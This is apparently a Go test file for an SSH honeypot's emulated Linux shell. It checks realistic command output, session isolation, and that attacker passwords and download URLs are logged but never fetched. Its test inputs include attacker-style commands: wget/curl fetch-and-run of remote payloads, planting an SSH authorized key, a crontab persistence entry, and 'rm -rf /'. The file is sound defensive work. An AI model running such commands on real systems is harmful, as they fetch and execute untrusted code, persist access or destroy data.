package shell

import (
	"bytes"
	"context"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/antonmedv/ssham/internal/audit"
	"github.com/antonmedv/ssham/internal/vfs"
)

type fakeTerm struct {
	out   bytes.Buffer
	input []string
}

func (f *fakeTerm) Write(p []byte) (int, error) { return f.out.Write(p) }

func (f *fakeTerm) ReadLine(prompt string, echo bool) (string, error) {
	f.out.WriteString(prompt)
	if len(f.input) == 0 {
		return "", io.EOF
	}
	l := f.input[0]
	f.input = f.input[1:]
	return l, nil
}

var testHost = vfs.Host{Hostname: "ip-10-0-2-15", Kernel: "6.8.0-48-generic", Booted: time.Now().Add(-48 * time.Hour)}

func newTestShell(t *testing.T, user string, log io.Writer) (*Shell, *fakeTerm) {
	t.Helper()
	if log == nil {
		log = io.Discard
	}
	term := &fakeTerm{}
	sh := New(Config{
		Host:     testHost,
		User:     user,
		FS:       vfs.NewBase(testHost).Clone(),
		Log:      audit.New(log).Session("test", "203.0.113.9:5555"),
		ClientIP: "203.0.113.9",
	}, term)
	return sh, term
}

func capture(t *testing.T, sh *Shell, line string) (string, int) {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	return sh.Capture(ctx, line, strings.NewReader(""))
}

func TestCommands(t *testing.T) {
	tests := []struct {
		user, line string
		want       []string // substrings expected in output
		notWant    []string
		code       int
	}{
		{"root", "whoami", []string{"root\n"}, nil, 0},
		{"admin", "whoami", []string{"admin\n"}, nil, 0},
		{"admin", "id", []string{"uid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo)"}, nil, 0},
		{"root", "pwd", []string{"/root\n"}, nil, 0},
		{"admin", "pwd", []string{"/home/admin\n"}, nil, 0},
		{"root", "uname -a", []string{"Linux ip-10-0-2-15 6.8.0-48-generic #48-Ubuntu", "x86_64 GNU/Linux"}, nil, 0},
		{"root", "uname -m", []string{"x86_64\n"}, nil, 0},
		{"root", "echo hello world", []string{"hello world\n"}, nil, 0},
		{"root", "echo -n hi", []string{"hi"}, []string{"\n"}, 0},
		{"root", `echo "a  b" 'c $HOME' $HOME`, []string{"a  b c $HOME /root\n"}, nil, 0},
		{"root", `X=5; echo "x=$X" ${Y:-dflt}`, []string{"x=5 dflt\n"}, nil, 0},
		{"root", "echo $((2 + 3 * 4))", []string{"20\n"}, nil, 0}, // left-to-right
		{"root", "echo $(echo nested) `echo tick`", []string{"nested tick\n"}, nil, 0},
		{"root", "nosuchcmd", []string{"nosuchcmd: command not found"}, nil, 127},
		{"root", "false || echo fallback", []string{"fallback"}, nil, 0},
		{"root", "true && echo yes; false && echo no", []string{"yes"}, []string{"no"}, 1},
		{"root", "cat /etc/passwd | grep root | wc -l", []string{"1\n"}, nil, 0},
		{"root", "cat /proc/cpuinfo | grep name | wc -l", []string{"4\n"}, nil, 0},
		{"root", "cat /proc/cpuinfo | grep 'model name' | head -1 | awk -F: '{print $2}'", []string{" Intel(R) Xeon(R)"}, nil, 0},
		{"root", "free -m | grep Mem | awk '{print $2}'", []string{"3911\n"}, nil, 0},
		{"root", "nproc", []string{"4\n"}, nil, 0},
		{"admin", "cat /etc/shadow", []string{"cat: /etc/shadow: Permission denied"}, nil, 1},
		{"root", "cat /etc/shadow | head -1", []string{"root:$y$"}, nil, 0},
		{"admin", "ls /root", []string{"ls: cannot open directory '/root': Permission denied"}, nil, 2},
		{"admin", "cd /root", []string{"-bash: cd: /root: Permission denied"}, nil, 1},
		{"root", "cd /tmp && pwd", []string{"/tmp\n"}, nil, 0},
		{"root", "cd /nope", []string{"No such file or directory"}, nil, 1},
		{"root", "ls /", []string{"bin\n", "etc\n", "usr\n"}, nil, 0},
		{"root", "ls -la /root", []string{"total", ".bashrc", "drwx------", " .\n"}, nil, 0},
		{"root", "ls -l /bin", []string{"lrwxrwxrwx", "bin -> usr/bin"}, nil, 0},
		{"root", "ls -l /usr/bin/sudo", []string{"-rwsr-xr-x"}, nil, 0},
		{"root", "echo test > /tmp/f; cat /tmp/f; echo more >> /tmp/f; cat /tmp/f", []string{"test\ntest\nmore\n"}, nil, 0},
		{"root", "mkdir -p /tmp/a/b && touch /tmp/a/b/c && ls -R /tmp/a", []string{"/tmp/a/b:\nc\n"}, nil, 0},
		{"root", "rm -rf /", []string{"it is dangerous to operate recursively on '/'"}, nil, 1},
		{"root", "rm /nope", []string{"rm: cannot remove '/nope': No such file or directory"}, nil, 1},
		{"root", "rm -f /nope", nil, []string{"rm:"}, 0},
		{"root", "ls /etc/*.conf", []string{"/etc/resolv.conf"}, nil, 0},
		{"root", "cd /etc && echo host*", []string{"hostname hosts"}, nil, 0},
		{"root", "echo '*'", []string{"*\n"}, nil, 0},
		{"root", "nonexist 2>/dev/null; echo $?", []string{"127\n"}, []string{"not found"}, 0},
		{"root", "nonexist 2>&1 | wc -l", []string{"1\n"}, nil, 0},
		{"root", "(echo a; echo b) | sort -r", []string{"b\na\n"}, nil, 0},
		{"root", "echo c b a | tr ' ' '\\n' | sort | head -2", []string{"a\nb\n"}, nil, 0},
		{"root", "echo hello | sed 's/l/L/g'", []string{"heLLo\n"}, nil, 0},
		{"root", "echo aGVsbG8K | base64 -d", []string{"hello\n"}, nil, 0},
		{"root", "echo -n hello | md5sum", []string{"5d41402abc4b2a76b9719d911017c592  -"}, nil, 0},
		{"root", "seq 3", []string{"1\n2\n3\n"}, nil, 0},
		{"root", "printf '%s-%d\\n' a 1 b 2", []string{"a-1\nb-2\n"}, nil, 0},
		{"root", "which ls", []string{"/usr/bin/ls\n"}, nil, 0},
		{"root", "type cd", []string{"cd is a shell builtin"}, nil, 0},
		{"root", "crontab -l", []string{"no crontab for root"}, nil, 1},
		{"root", "(crontab -l 2>/dev/null; echo '* * * * * /tmp/x') | crontab - && crontab -l", []string{"* * * * * /tmp/x\n"}, nil, 0},
		{"admin", "echo 'admin:pw' | chpasswd", []string{"Authentication token manipulation error"}, nil, 1},
		{"root", "echo 'root:newpw' | chpasswd", nil, []string{"error"}, 0},
		{"root", "cd ~ && rm -rf .ssh && mkdir .ssh && echo 'ssh-rsa AAAA x' >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cat ~/.ssh/authorized_keys", []string{"ssh-rsa AAAA x\n"}, nil, 0},
		{"root", "chmod 755 /tmp && ls -ld /tmp", []string{"drwxr-xr-x"}, nil, 0},
		{"root", "wget -q http://198.51.100.7/x.sh -O /tmp/x.sh && sh /tmp/x.sh; echo rc=$?", []string{"rc=0"}, nil, 0},
		{"root", "curl -s ifconfig.me", []string{"18.197.42.103"}, nil, 0},
		{"root", "cd /tmp; wget http://evil.example/bot; chmod +x bot; ./bot", []string{"Saving to: ‘bot’", "Segmentation fault"}, nil, 139},
		{"root", "/usr/bin/whoami", []string{"root\n"}, nil, 0},
		{"root", "rm /usr/bin/ls; ls", []string{"ls: command not found"}, nil, 127},
		{"root", "export FOO=bar; env | grep FOO", []string{"FOO=bar"}, nil, 0},
		{"root", "echo 'echo from script $1' > /tmp/s.sh; chmod +x /tmp/s.sh; /tmp/s.sh arg", []string{"from script arg"}, nil, 0},
		{"root", "bash -c 'echo inline; whoami'", []string{"inline\nroot\n"}, nil, 0},
		{"root", "echo 'echo piped' | sh", []string{"piped\n"}, nil, 0},
		{"root", "if true; then", []string{"command not found"}, nil, 127},
		{"root", "echo 'unterminated", []string{"syntax error"}, nil, 2},
		{"root", "| foo", []string{"syntax error near unexpected token `|'"}, nil, 2},
		{"root", "ls -d /tmp /etc", []string{"/etc\n/tmp\n"}, nil, 0},
		{"root", "test -d /etc && echo dir; [ -f /etc/passwd ] && echo file; [ 3 -gt 5 ] || echo small", []string{"dir\nfile\nsmall\n"}, nil, 0},
		{"root", "echo ${#HOME}", []string{"5\n"}, nil, 0},
		{"root", "cat /etc/os-release | grep PRETTY", []string{`PRETTY_NAME="Ubuntu 24.04.1 LTS"`}, nil, 0},
		{"root", "hostname", []string{"ip-10-0-2-15\n"}, nil, 0},
		{"root", "ls -lh $(which ls)", []string{"/usr/bin/ls"}, nil, 0},
		{"root", "find /etc -name 'host*'", []string{"/etc/hostname\n", "/etc/hosts\n"}, nil, 0},
		{"admin", "find /root", []string{"find: '/root': Permission denied"}, nil, 1},
		{"root", "cp /etc/hosts /tmp/h && mv /tmp/h /tmp/h2 && cat /tmp/h2 | head -1", []string{"127.0.0.1 localhost"}, nil, 0},
		{"root", "ln -s /etc/hostname /tmp/hn && cat /tmp/hn", []string{"ip-10-0-2-15"}, nil, 0},
		{"root", "ps aux | grep sshd | head -1", []string{"sshd"}, nil, 0},
		{"root", "echo a;; echo b", []string{"syntax error"}, nil, 2},
		{"root", "yes | head -3", []string{"y\ny\ny\n"}, nil, 0},
		{"root", "exit 3", nil, nil, 3},
		{"root", "uptime", []string{"up 2 days", "load average"}, nil, 0},
		{"root", "echo $SHELL $USER", []string{"/bin/bash root"}, nil, 0},
		{"root", "awk 'BEGIN{x=1}' /dev/null; echo ok", []string{"ok"}, nil, 0},
		{"root", "cat /etc/passwd | awk -F: '{print $1}' | head -2", []string{"root\ndaemon\n"}, nil, 0},
		{"root", "echo a b c | xargs -n1 echo", []string{"a b c\n"}, nil, 0},
		{"root", "echo 'x' > /etc/hostname && cat /etc/hostname", []string{"x\n"}, nil, 0},
		{"admin", "echo x > /etc/hostname", []string{"-bash: /etc/hostname: Permission denied"}, nil, 1},
	}
	for _, tt := range tests {
		t.Run(tt.user+": "+tt.line, func(t *testing.T) {
			sh, _ := newTestShell(t, tt.user, nil)
			out, code := capture(t, sh, tt.line)
			for _, w := range tt.want {
				if !strings.Contains(out, w) {
					t.Errorf("output missing %q\n--- got ---\n%s", w, out)
				}
			}
			for _, nw := range tt.notWant {
				if strings.Contains(out, nw) {
					t.Errorf("output should not contain %q\n--- got ---\n%s", nw, out)
				}
			}
			if code != tt.code {
				t.Errorf("exit code = %d, want %d\n--- output ---\n%s", code, tt.code, out)
			}
		})
	}
}

func TestSessionsAreIsolated(t *testing.T) {
	base := vfs.NewBase(testHost)
	mk := func() *Shell {
		return New(Config{Host: testHost, User: "root", FS: base.Clone(), Log: audit.New(io.Discard).Session("t", "x")}, &fakeTerm{})
	}
	a, b := mk(), mk()
	capture(t, a, "rm -rf /etc && touch /tmp/marker")
	if out, _ := capture(t, b, "ls /tmp/marker; cat /etc/hostname"); !strings.Contains(out, "No such file") || !strings.Contains(out, "ip-10-0-2-15") {
		t.Fatalf("second session saw first session's changes:\n%s", out)
	}
}

func TestInteractiveSudoAndExit(t *testing.T) {
	var log bytes.Buffer
	sh, term := newTestShell(t, "admin", &log)
	term.input = []string{"sudo -i", "hunter2", "whoami", "exit", "whoami", "exit"}
	code := sh.Run(context.Background())
	out := term.out.String()
	if code != 0 {
		t.Errorf("exit code = %d", code)
	}
	for _, w := range []string{"[sudo] password for admin: ", "root@ip-10-0-2-15:~# ", "root\n", "admin\n", "admin@ip-10-0-2-15:~$ "} {
		if !strings.Contains(out, w) {
			t.Errorf("output missing %q\n%s", w, out)
		}
	}
	if !strings.Contains(log.String(), `"password":"hunter2"`) {
		t.Errorf("sudo password not logged:\n%s", log.String())
	}
	if !strings.Contains(log.String(), `"line":"whoami"`) {
		t.Errorf("commands not logged:\n%s", log.String())
	}
}

func TestDownloadsAreLoggedNotFetched(t *testing.T) {
	var log bytes.Buffer
	sh, _ := newTestShell(t, "root", &log)
	capture(t, sh, "curl -fsSL http://192.0.2.1:8080/payload.sh | sh")
	if !strings.Contains(log.String(), `"url":"http://192.0.2.1:8080/payload.sh"`) {
		t.Fatalf("download not logged:\n%s", log.String())
	}
}

func TestInterruptStopsLongCommand(t *testing.T) {
	sh, _ := newTestShell(t, "root", nil)
	done := make(chan int)
	go func() { done <- sh.Exec(context.Background(), "sleep 100") }()
	time.Sleep(100 * time.Millisecond)
	sh.Interrupt()
	select {
	case code := <-done:
		if code != 130 {
			t.Errorf("code = %d, want 130", code)
		}
	case <-time.After(3 * time.Second):
		t.Fatal("sleep was not interrupted")
	}
}

func TestRecursionIsBounded(t *testing.T) {
	sh, _ := newTestShell(t, "root", nil)
	out, _ := capture(t, sh, "echo 'sh /tmp/r.sh' > /tmp/r.sh; sh /tmp/r.sh")
	if !strings.Contains(out, "maximum nesting level exceeded") {
		t.Errorf("unexpected output: %s", out)
	}
}

func TestComplete(t *testing.T) {
	sh, _ := newTestShell(t, "root", nil)
	if _, c := sh.Complete("whoa"); len(c) != 1 || c[0] != "whoami" {
		t.Errorf("command completion = %v", c)
	}
	if _, c := sh.Complete("cat /etc/host"); len(c) != 2 {
		t.Errorf("path completion = %v", c)
	}
	if _, c := sh.Complete("cd /us"); len(c) != 1 || c[0] != "/usr/" {
		t.Errorf("dir completion = %v", c)
	}
}
